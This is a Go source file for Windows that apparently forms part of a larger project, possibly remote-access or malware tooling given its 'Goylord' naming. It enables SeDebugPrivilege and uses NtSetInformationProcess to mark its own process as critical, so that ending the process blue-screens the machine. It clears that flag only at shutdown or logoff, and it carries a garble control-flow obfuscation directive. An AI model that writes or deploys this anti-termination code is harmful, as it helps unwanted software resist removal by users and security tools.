//go:build windows
// +build windows

package criticalproc

import (
	"fmt"
	"log"
	"runtime"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modntdll                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtSetInformationProcess = modntdll.NewProc("NtSetInformationProcess")
	modkernel32                 = windows.NewLazySystemDLL("kernel32.dll")
	procSetConsoleCtrlHandler   = modkernel32.NewProc("SetConsoleCtrlHandler")
	procGetModuleHandleW        = modkernel32.NewProc("GetModuleHandleW")
	moduser32                   = windows.NewLazySystemDLL("user32.dll")
	procRegisterClassExW        = moduser32.NewProc("RegisterClassExW")
	procCreateWindowExW         = moduser32.NewProc("CreateWindowExW")
	procDefWindowProcW          = moduser32.NewProc("DefWindowProcW")
	procGetMessageW             = moduser32.NewProc("GetMessageW")
	procTranslateMessage        = moduser32.NewProc("TranslateMessage")
	procDispatchMessageW        = moduser32.NewProc("DispatchMessageW")

	stateMu                   sync.Mutex
	breakOnTerminationEnabled bool
	shutdownHandlerRegistered bool
	consoleCtrlCallback       uintptr
	shutdownWindowCallback    uintptr
)

const processBreakOnTermination = 29
const (
	ctrlCloseEvent    = 2
	ctrlLogoffEvent   = 5
	ctrlShutdownEvent = 6
	wmQueryEndSession = 0x0011
	wmEndSession      = 0x0016
)

type wndClassEx struct {
	cbSize        uint32
	style         uint32
	lpfnWndProc   uintptr
	cbClsExtra    int32
	cbWndExtra    int32
	hInstance     windows.Handle
	hIcon         windows.Handle
	hCursor       windows.Handle
	hbrBackground windows.Handle
	lpszMenuName  *uint16
	lpszClassName *uint16
	hIconSm       windows.Handle
}

type point struct {
	x int32
	y int32
}

type msg struct {
	hwnd    windows.Handle
	message uint32
	wParam  uintptr
	lParam  uintptr
	time    uint32
	pt      point
}

func Setup() {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if !windows.GetCurrentProcessToken().IsElevated() {
		log.Printf("[criticalproc] not running as administrator, skipping critical process flag")
		return
	}
	if err := enableSeDebugPrivilege(); err != nil {
		log.Printf("[criticalproc] failed to enable SeDebugPrivilege: %v", err)
		return
	}
	if err := ntSetBreakOnTermination(1); err != nil {
		log.Printf("[criticalproc] failed to set critical process: %v", err)
		return
	}
	stateMu.Lock()
	breakOnTerminationEnabled = true
	stateMu.Unlock()
	registerShutdownHandler()
	log.Printf("[criticalproc] process marked as critical")
}

func Teardown() {
	stateMu.Lock()
	enabled := breakOnTerminationEnabled
	stateMu.Unlock()
	if !enabled {
		return
	}
	if err := ntSetBreakOnTermination(0); err != nil {
		log.Printf("[criticalproc] failed to unset critical process: %v", err)
		return
	}
	stateMu.Lock()
	breakOnTerminationEnabled = false
	stateMu.Unlock()
}

func registerShutdownHandler() {
	stateMu.Lock()
	if shutdownHandlerRegistered {
		stateMu.Unlock()
		return
	}
	shutdownHandlerRegistered = true
	stateMu.Unlock()

	consoleCtrlCallback = windows.NewCallback(func(ctrlType uint32) uintptr {
		switch ctrlType {
		case ctrlCloseEvent, ctrlLogoffEvent, ctrlShutdownEvent:
			Teardown()
		}
		return 0
	})

	ret, _, err := procSetConsoleCtrlHandler.Call(consoleCtrlCallback, 1)
	if ret == 0 {
		log.Printf("[criticalproc] failed to register shutdown handler: %v", err)
	}
	go runShutdownWindow()
}

func runShutdownWindow() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	className, err := windows.UTF16PtrFromString("GoylordCriticalProcessShutdownWindow")
	if err != nil {
		log.Printf("[criticalproc] failed to create shutdown window class name: %v", err)
		return
	}

	instance, _, _ := procGetModuleHandleW.Call(0)
	shutdownWindowCallback = windows.NewCallback(func(hwnd uintptr, msg uint32, wParam uintptr, lParam uintptr) uintptr {
		switch msg {
		case wmQueryEndSession:
			Teardown()
			return 1
		case wmEndSession:
			if wParam != 0 {
				Teardown()
			}
		}
		ret, _, _ := procDefWindowProcW.Call(hwnd, uintptr(msg), wParam, lParam)
		return ret
	})

	wc := wndClassEx{
		cbSize:        uint32(unsafe.Sizeof(wndClassEx{})),
		lpfnWndProc:   shutdownWindowCallback,
		hInstance:     windows.Handle(instance),
		lpszClassName: className,
	}
	ret, _, registerErr := procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))
	if ret == 0 {
		log.Printf("[criticalproc] failed to register shutdown window class: %v", registerErr)
		return
	}

	hwnd, _, createErr := procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(className)),
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		instance,
		0,
	)
	if hwnd == 0 {
		log.Printf("[criticalproc] failed to create shutdown window: %v", createErr)
		return
	}

	var message msg
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&message)), hwnd, 0, 0)
		if int32(ret) <= 0 {
			return
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&message)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&message)))
	}
}

func enableSeDebugPrivilege() error {
	var hToken windows.Token
	err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&hToken,
	)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	seDebugName, err := windows.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, seDebugName, &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValue: %w", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(hToken, false, &tp, 0, nil, nil)
}

func ntSetBreakOnTermination(val uint32) error {
	ret, _, _ := procNtSetInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		processBreakOnTermination,
		uintptr(unsafe.Pointer(&val)),
		unsafe.Sizeof(val),
	)
	if ret != 0 {
		return fmt.Errorf("NtSetInformationProcess(ProcessBreakOnTermination) failed: NTSTATUS 0x%x", ret)
	}
	return nil
}
